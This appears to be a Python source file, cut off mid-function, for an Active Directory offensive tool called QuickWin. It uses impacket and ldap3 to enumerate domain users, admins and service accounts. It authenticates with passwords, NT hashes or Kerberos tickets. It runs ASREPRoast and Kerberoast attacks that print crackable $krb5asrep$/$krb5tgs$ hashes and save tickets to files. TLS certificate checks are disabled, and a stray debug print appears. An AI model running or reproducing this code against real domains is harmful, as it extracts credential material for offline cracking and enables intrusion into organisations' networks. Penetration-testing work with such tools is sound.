#!/usr/bin/env python
from __future__ import division, print_function

import argparse
import binascii
import codecs
import datetime
import json
import logging
import os
import random
import ssl
import sys
import traceback
from binascii import hexlify, unhexlify
from enum import Enum

import ldap3
import ldapdomaindump
from colorama import Back, Fore, Style
from impacket import uuid, version
from impacket.dcerpc.v5.samr import (UF_ACCOUNTDISABLE, UF_NOT_DELEGATED,
                                     UF_TRUSTED_FOR_DELEGATION,
                                     UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
from impacket.examples import logger, utils
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import (AS_REP, AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR,
                                TGS_REP, seq_set, seq_set_iter)
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import (KerberosError, getKerberosTGS,
                                      getKerberosTGT, sendReceive)
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1, ldaptypes
from impacket.ldap.ldaptypes import (ACCESS_ALLOWED_ACE,
                                     ACCESS_ALLOWED_OBJECT_ACE, ACE,
                                     SR_SECURITY_DESCRIPTOR)
# from impacket.msada_guids import EXTENDED_RIGHTS, SCHEMA_OBJECTS
from impacket.ntlm import base64, compute_lmhash, compute_nthash
from impacket.smbconnection import SessionError, SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.structure import hexdump
from impacket.uuid import bin_to_string, string_to_bin
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars
from prettytable import PrettyTable
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

DEBUG_MODULE = False
# TODO servicePrincipalName OPSEC ?
# TODO adminCount OPSEC?

admin_filter = (
        "(&(objectClass=user)(objectCategory=Person)(adminCount=1))")
controllers_filter = (
    "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
)
all_user_filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
blocked_user_filter = "(userAccountControl:1.2.840.113556.1.4.803:=2)"
all_group_filter = "(objectCategory=group)"
all_computer_filter = "(objectCategory=computer)"
group_members_filter = "(&(objectClass=group)(sAMAccountName=<GROUPNAME>))"
password_policy_filter = "(objectClass=domainDNS)"
grained_password_policies_filter = "(objectClass=MsDS-PasswordSettings)"

spn_user_filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(servicePrincipalName=0)))"
detail_filter = "(sAMAccountName=USERNAME)"
delegation_filter = (
    "(&(objectCategory=user)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
    "(!(objectCategory=computer)))"
)
delegation_filter = "(&(|(objectCategory=user)(objectCategory=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
sid_filter = "(objectSid=SID)"
unconstrained_computer_filter = ""
unconstrained_user_filter = ""
constrained_computer_filter = ""
constrained_user_filter = ""
rbcd_filter = ""
laps_filter = ""


def target_type(target):
    domain, username, password, address = parse_target(target)

    if username == "":
        raise argparse.ArgumentTypeError("Username must be specified")

    if domain == "":
        raise argparse.ArgumentTypeError(
            "Domain of user '{}' must be specified".format(username)
        )

    if address == "":
        raise argparse.ArgumentTypeError(
            "Target address (hostname or IP) must be specified"
        )

    return domain, username, password, address


def get_dn(domain):
    components = domain.split(".")
    base = ""
    for comp in components:
        base += f",DC={comp}"

    return base[1:]


def get_machine_name(domain_controller, domain):
    if domain_controller is not None:
        s = SMBConnection(domain_controller, domain_controller)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login("", "")
    except Exception:
        if s.getServerName() == "":
            raise Exception("Error while anonymous logging into %s" % domain)
    else:
        s.logoff()
    return s.getServerName()


def init_ldap_connection(
    target,
    tls_version,
    domain,
    username,
    password,
    lmhash,
    nthash,
    domain_controller,
    kerberos,
    hashes,
    aesKey,
):
    user = "%s\\%s" % (domain, username)
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    # logging.info(f"Binding to {target}")
    ldap_server = ldap3.Server(
        target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls
    )
    if kerberos:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(
            ldap_session,
            target,
            username,
            password,
            domain,
            lmhash,
            nthash,
            aesKey,
            kdcHost=domain_controller,
        )
    elif hashes is not None:
        print("awelajwkle")
        if lmhash == "":
            lmhash = "aad3b435b51404eeaad3b435b51404ee"
        ldap_session = ldap3.Connection(
            ldap_server,
            user=user,
            password=lmhash + ":" + nthash,
            authentication=ldap3.NTLM,
            auto_bind=True,
        )
    elif username == "" and password == "":
        logging.debug("Performing anonymous bind")
        ldap_session = ldap3.Connection(
            ldap_server, authentication=ANONYMOUS, auto_bind=True
        )
    else:
        ldap_session = ldap3.Connection(
            ldap_server,
            user=user,
            password=password,
            authentication=ldap3.NTLM,
            auto_bind=True,
        )

    return ldap_server, ldap_session


def init_ldap_session(
    domain,
    username,
    password,
    lmhash,
    nthash,
    kerberos,
    domain_controller,
    ldaps,
    hashes,
    aesKey,
    no_smb,
):
    if kerberos:
        if no_smb:
            logging.info(
                f"Setting connection target to {domain_controller} without SMB connection"
            )
            target = domain_controller
        else:
            target = get_machine_name(domain_controller, domain)
    else:
        if domain_controller is not None:
            target = domain_controller
        else:
            target = domain

    if ldaps:
        logging.info("Targeting LDAPS")
        try:
            return init_ldap_connection(
                target,
                ssl.PROTOCOL_TLSv1_2,
                domain,
                username,
                password,
                lmhash,
                nthash,
                domain_controller,
                kerberos,
                hashes,
                aesKey,
            )
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(
                target,
                ssl.PROTOCOL_TLSv1,
                domain,
                username,
                password,
                lmhash,
                nthash,
                domain_controller,
                kerberos,
                hashes,
                aesKey,
            )
    else:
        return init_ldap_connection(
            target,
            None,
            domain,
            username,
            password,
            lmhash,
            nthash,
            domain_controller,
            kerberos,
            hashes,
            aesKey,
        )


def ldap3_kerberos_login(
    connection,
    target,
    user,
    password,
    domain="",
    lmhash="",
    nthash="",
    aesKey="",
    kdcHost=None,
    TGT=None,
    TGS=None,
    useCache=True,
):
    from pyasn1.codec.ber import decoder, encoder
    from pyasn1.type.univ import noValue

    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != "" or nthash != "":
        if len(lmhash) % 2:
            lmhash = "0" + lmhash
        if len(nthash) % 2:
            nthash = "0" + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    import datetime

    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AP_REQ, TGS_REP, Authenticator, seq_set
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
    from impacket.krb5.types import KerberosTime, Principal, Ticket

    if TGT is not None or TGS is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv("KRB5CCNAME"))
        except Exception as e:
            # No cache present
            print(e)
            pass
        else:
            # retrieve domain information from CCache file if needed
            if domain == "":
                domain = ccache.principal.realm["data"].decode("utf-8")
                logging.debug("Domain retrieved from CCache: %s" % domain)

            logging.debug("Using Kerberos Cache: %s" % os.getenv("KRB5CCNAME"))
            principal = "ldap/%s@%s" % (target.upper(), domain.upper())

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = "krbtgt/%s@%s" % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logging.debug("Using TGT from cache")
                else:
                    logging.debug("No valid credentials found in cache")
            else:
                TGS = creds.toTGS(principal)
                logging.debug("Using TGS from cache")

            # retrieve user information from CCache file if needed
            if user == "" and creds is not None:
                user = creds["client"].prettyPrint().split(b"@")[0].decode("utf-8")
                logging.debug("Username retrieved from CCache: %s" % user)
            elif user == "" and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]["data"].decode("utf-8")
                logging.debug("Username retrieved from CCache: %s" % user)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName, password, domain, lmhash, nthash, aesKey, kdcHost
            )
    else:
        tgt = TGT["KDC_REP"]
        cipher = TGT["cipher"]
        sessionKey = TGT["sessionKey"]

    if TGS is None:
        serverName = Principal(
            "ldap/%s" % target, type=constants.PrincipalNameType.NT_SRV_INST.value
        )
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
            serverName, domain, kdcHost, tgt, cipher, sessionKey
        )
    else:
        tgs = TGS["KDC_REP"]
        cipher = TGS["cipher"]
        sessionKey = TGS["sessionKey"]

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob["MechTypes"] = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs["ticket"])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq["pvno"] = 5
    apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq["ap-options"] = constants.encodeFlags(opts)
    seq_set(apReq, "ticket", ticket.to_asn1)

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = domain
    seq_set(authenticator, "cname", userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(
        sessionKey, 11, encodedAuthenticator, None
    )

    apReq["authenticator"] = noValue
    apReq["authenticator"]["etype"] = cipher.enctype
    apReq["authenticator"]["cipher"] = encryptedEncodedAuthenticator

    blob["MechToken"] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(
        connection.version, ldap3.SASL, user, None, "GSS-SPNEGO", blob.getData()
    )

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(
        connection.send("bindRequest", request, None)
    )
    connection.sasl_in_progress = False
    if response[0]["result"] != 0:
        raise Exception(response)

    connection.bound = True

    return True


def bin2hex(data, indent=""):
    if data is None:
        return
    if isinstance(data, int):
        data = str(data).encode("utf-8")
    x = bytearray(data)
    strLen = len(x)
    i = 0
    line = ""
    while i < strLen:
        for j in range(16):
            if i + j < strLen:
                line += "%02X" % x[i + j]
            else:
                line += ""
            if j % 16 == 7:
                line += ""
        # line += "  "
        # line += "".join(pretty_print(x) for x in x[i : i + 16])
        i += 16

    print(line)
    return line


def filter_search(ldapConnection, filter_str, attributes):
    if DEBUG_MODULE:
        print(Fore.GREEN + "[*] Filter: " + Style.BRIGHT + f"{filter_str}")
        print(
            Style.NORMAL
            # + Fore.YELLOW
            + "[*] Attributes: "
            + Style.BRIGHT
            + Fore.GREEN
            + f"{attributes}"
        )
    try:
        resp = ldapConnection.search(
            searchFilter=filter_str,
            sizeLimit=999,
            attributes=attributes,
        )
    except ldap.LDAPSearchError as e:
        if e.getErrorString().find("sizeLimitExceeded") >= 0:
            print(Fore.YELLOW)
            logging.debug(
                "sizeLimitExceeded exception caught, giving up and processing the data received"
            )
            resp = e.getAnswers()
            print(Style.RESET_ALL)
            pass
        else:
            raise
    return resp


class QuickWin:
    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__ldapConnection = None
        self.__query_group = None
        self.__request_user = None
        self.__saveTGS = None
        self.__outputFileName = None
        self.__detail = None
        self.__detail_sid = None
        self.__acl_detail = None
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(":")
        # Create the baseDN
        domainParts = self.__targetDomain.split(".")
        self.baseDN = ""
        for i in domainParts:
            self.baseDN += "dc=%s," % i
        # Remote last ','
        self.baseDN = self.baseDN[:-1]
        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            print(Fore.YELLOW)
            logging.warning(
                "KDC IP address and hostname will be ignored because of cross-domain targeting."
            )
            self.__kdcIP = None
            self.__kdcHost = None

    def ASREPRoast_getTGT(self, userName, requestPAC=True):

        clientName = Principal(
            userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        asReq = AS_REQ()

        domain = self.__domain.upper()
        serverName = Principal(
            "krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest["include-pac"] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq["pvno"] = 5
        asReq["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq["padata"] = noValue
        asReq["padata"][0] = noValue
        asReq["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
        )
        asReq["padata"][0]["padata-value"] = encodedPacRequest

        reqBody = seq_set(asReq, "req-body")

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody["kdc-options"] = constants.encodeFlags(opts)

        seq_set(reqBody, "sname", serverName.components_to_asn1)
        seq_set(reqBody, "cname", clientName.components_to_asn1)

        if domain == "":
            raise Exception("Empty Domain not allowed in Kerberos")

        reqBody["realm"] = domain

        now = datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=1)
        reqBody["till"] = KerberosTime.to_asn1(now)
        reqBody["rtime"] = KerberosTime.to_asn1(now)
        reqBody["nonce"] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, "etype", supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcIP)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                )
                seq_set_iter(reqBody, "etype", supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcIP)
            else:
                raise e
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception(
                "User %s doesn't have UF_DONT_REQUIRE_PREAUTH set" % userName
            )
        if asRep["enc-part"]["etype"] == 17 or asRep["enc-part"]["etype"] == 18:
            return "$krb5asrep$%d$%s$%s$%s$%s" % (
                asRep["enc-part"]["etype"],
                clientName,
                domain,
                hexlify(asRep["enc-part"]["cipher"].asOctets()[-12:]).decode(),
                hexlify(asRep["enc-part"]["cipher"].asOctets()[:-12]).decode(),
            )
        else:
            return "$krb5asrep$%d$%s@%s:%s$%s" % (
                asRep["enc-part"]["etype"],
                clientName,
                domain,
                hexlify(asRep["enc-part"]["cipher"].asOctets()[:16]).decode(),
                hexlify(asRep["enc-part"]["cipher"].asOctets()[16:]).decode(),
            )

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(
            self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        print(f"[*] Prepare request a TGT ticket: {userName}")

        if self.__password != "" and (self.__lmhash == "" and self.__nthash == ""):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName,
                    "",
                    self.__domain,
                    compute_lmhash(self.__password),
                    compute_nthash(self.__password),
                    self.__aesKey,
                    kdcHost=self.__kdcIP,
                )
            except Exception as e:
                logging.debug("TGT: %s" % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName,
                    self.__password,
                    self.__domain,
                    unhexlify(self.__lmhash),
                    unhexlify(self.__nthash),
                    self.__aesKey,
                    kdcHost=self.__kdcIP,
                )
        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName,
                self.__password,
                self.__domain,
                unhexlify(self.__lmhash),
                unhexlify(self.__nthash),
                self.__aesKey,
                kdcHost=self.__kdcIP,
            )
        TGT = {}
        TGT["KDC_REP"] = tgt
        TGT["cipher"] = cipher
        TGT["sessionKey"] = sessionKey
        return TGT

    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]

        if (
            decodedTGS["ticket"]["enc-part"]["etype"]
            == constants.EncryptionTypes.rc4_hmac.value
        ):
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                constants.EncryptionTypes.rc4_hmac.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()
                ).decode(),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()
                ).decode(),
            )
            if fd is None:
                print(entry)
            else:
                print(entry)
                print(
                    Fore.GREEN + Style.NORMAL + f"\n[+] Save to {self.__outputFileName}"
                )
                fd.write(entry + "\n")
        elif (
            decodedTGS["ticket"]["enc-part"]["etype"]
            == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
        ):
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()
                ).decode(),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()
                ).decode(),
            )
            if fd is None:
                print(entry)
            else:
                print(entry)
                print(Fore.GREEN + Style.NORMAL + f"[+] Save:  {self.__outputFileName}")
                fd.write(entry + "\n")
        elif (
            decodedTGS["ticket"]["enc-part"]["etype"]
            == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
        ):
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()
                ).decode(),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()
                ).decode(),
            )
            if fd is None:
                print(entry)
            else:
                print(entry)
                print(Fore.GREEN + Style.NORMAL + f"[+] Save:  {self.__outputFileName}")
                fd.write(entry + "\n")
        elif (
            decodedTGS["ticket"]["enc-part"]["etype"]
            == constants.EncryptionTypes.des_cbc_md5.value
        ):
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                constants.EncryptionTypes.des_cbc_md5.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()
                ).decode(),
                hexlify(
                    decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()
                ).decode(),
            )
            if fd is None:
                print(entry)
            else:
                print(entry)
                print(Fore.GREEN + Style.NORMAL + f"[+] Save:  {self.__outputFileName}")
                fd.write(entry + "\n")
        else:
            logging.error(
                "Skipping %s/%s due to incompatible e-type %d"
                % (
                    decodedTGS["ticket"]["sname"]["name-string"][0],
                    decodedTGS["ticket"]["sname"]["name-string"][1],
                    decodedTGS["ticket"]["enc-part"]["etype"],
                )
            )

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug("About to save TGS for %s" % username)
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                ccache.saveFile("%s.ccache" % username)
            except Exception as e:
                logging.error(str(e))

    def ASREPRoast(self):

        if self.__request_user is not None:

            print(Style.NORMAL + Fore.GREEN + "\n[*] Lanuch ASREPRoast attack")
            print(Style.NORMAL + Fore.GREEN + f"[+] ASREPRoast: {self.__request_user}")
            entry = self.ASREPRoast_getTGT(self.__request_user)
            print(Style.BRIGHT + Fore.YELLOW)

            if self.__outputFileName is not None:
                if os.path.exists(self.__outputFileName):
                    fd = open(self.__outputFileName, "a")
                else:
                    fd = open(self.__outputFileName, "w+")
            else:
                fd = None

            if fd is None:
                print(entry)
            else:
                print(entry)
                print(
                    Fore.GREEN + Style.NORMAL + f"\n[+] Save to {self.__outputFileName}"
                )
                fd.write(entry + "\n")
            return

        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query DONT_REQ_PREAUTH user")
        resp = filter_search(
            self.__ldapConnection,
            all_user_filter,
            ["sAMAccountName", "userAccountControl"],
        )
        table = PrettyTable()
        table.field_names = ["sAMAccountName", "userAccountControl"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            name = ""
            userAccountControl = None
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "userAccountControl":
                        if (
                            str(attribute["vals"][0]) == "4194816"
                            or str(attribute["vals"][0]) == "4260352"
                        ):

                            userAccountControl = str(attribute["vals"][0])
                if userAccountControl is not None:
                    table.add_row([name, userAccountControl])
            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def Kerberoast(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Lanuch Kerberoast attack")
        print(f"[+] Kerberoast: {self.__kerberoast_username}")
        downLevelLogonName = self.__targetDomain + "\\" + self.__kerberoast_username
        TGT = self.getTGT()
        try:
            principalName = Principal()
            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
            principalName.components = [downLevelLogonName]
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                principalName,
                self.__domain,
                self.__kdcIP,
                TGT["KDC_REP"],
                TGT["cipher"],
                TGT["sessionKey"],
            )
            print(Fore.YELLOW + Style.BRIGHT)

            if self.__outputFileName is not None:
                if os.path.exists(self.__outputFileName):
                    fd = open(self.__outputFileName, "a")
                else:
                    fd = open(self.__outputFileName, "w+")
            else:
                fd = None
            self.outputTGS(
                tgs,
                oldSessionKey,
                sessionKey,
                self.__kerberoast_username,
                self.__targetDomain + "/" + self.__kerberoast_username,
                fd,
            )
            if fd is not None:
                fd.close()
        except Exception as e:
            print(Fore.RED)
            logging.debug("Exception:", exc_info=True)
            logging.error("Principal: %s - %s" % (downLevelLogonName, str(e)))

    def get_sspn_user(self):

        print(
            Style.NORMAL
            + Fore.GREEN
            + "\n[*] Start query domain spn user (stealth model)"
        )
        resp = filter_search(
            self.__ldapConnection,
            all_user_filter,
            ["sAMAccountName", "servicePrincipalName"],
        )
        table = PrettyTable()
        table.field_names = ["sAMAccountName", "servicePrincipalName"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            servicePrincipalName = None
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "servicePrincipalName":
                        for iteam in attribute["vals"]:
                            servicePrincipalName = iteam
                            table.add_row([name, servicePrincipalName])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_spn_user(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query spn user")
        resp = filter_search(
            self.__ldapConnection,
            spn_user_filter,
            ["sAMAccountName", "servicePrincipalName"],
        )
        table = PrettyTable()
        table.field_names = ["sAMAccountName", "servicePrincipalName"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            servicePrincipalName = ""
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "servicePrincipalName":
                        for iteam in attribute["vals"]:
                            servicePrincipalName = iteam
                            table.add_row([name, servicePrincipalName])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_blocked_user(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain blocked user")
        resp = filter_search(
            self.__ldapConnection,
            blocked_user_filter,
            ["sAMAccountName", "description"],
        )
        table = PrettyTable()
        table.field_names = ["blocked user", "description"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            description = None
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "description":
                        description = str(attribute["vals"][0])
                table.add_row([name, description])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_sid_detail(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query a SID detail")
        resp = filter_search(
            self.__ldapConnection,
            sid_filter.replace("SID", str(self.__detail_sid)),
            None,
        )
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}\n"
            + Style.NORMAL
        )

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            try:
                for attribute in item["attributes"]:
                    key = str(attribute["type"])
                    if key == "objectSid":
                        data = bytes(attribute["vals"][0])
                        sid = format_sid(attribute["vals"][0])
                        value = sid

                    elif key == "objectGUID":
                        guid = uuid.bin_to_string(bytes(attribute["vals"][0]))
                        value = guid
                    else:
                        value = str(attribute["vals"][0])
                    if (
                        key == "msDS-AllowedToDelegateTo"
                        or key == "servicePrincipalName"
                        or key == "managedObjects"
                        or key == "memberOf"
                        or key == "member"
                        or key == "managedBy"
                        or key == "objectSid"
                    ):

                        print(
                            Style.BRIGHT
                            + Fore.RED
                            + f"{key}: "
                            + Style.BRIGHT
                            + Fore.YELLOW
                            + f"{value}",
                        )
                    elif key == "userAccountControl":
                        if int(attribute["vals"][0]) & UF_ACCOUNTDISABLE:
                            print(
                                Style.BRIGHT
                                + Fore.RED
                                + f"{key}: "
                                + Style.BRIGHT
                                + Fore.YELLOW
                                + f"{value}"
                                + Style.BRIGHT
                                + Fore.RED
                                + " (ACCOUNT DISABLE !)",
                            )
                        else:
                            print(
                                Style.BRIGHT
                                + Fore.RED
                                + f"{key}: "
                                + Style.BRIGHT
                                + Fore.YELLOW
                                + f"{value}",
                            )
                    elif key == "msDS-AllowedToActOnBehalfOfOtherIdentity":
                        value = ""
                        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                            data=bytes(attribute["vals"][0])
                        )
                        for ace in sd["Dacl"].aces:
                            value += ace["Ace"]["Sid"].formatCanonical()
                            value += ", "

                        ## ACE
                        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                            data=bytes(attribute["vals"][0])
                        )

                        for ace in sd["Dacl"].aces:
                            print(f"[+] {ace["TypeName"]}")
                        ## ACE
                        value = value[:-2]
                        print(
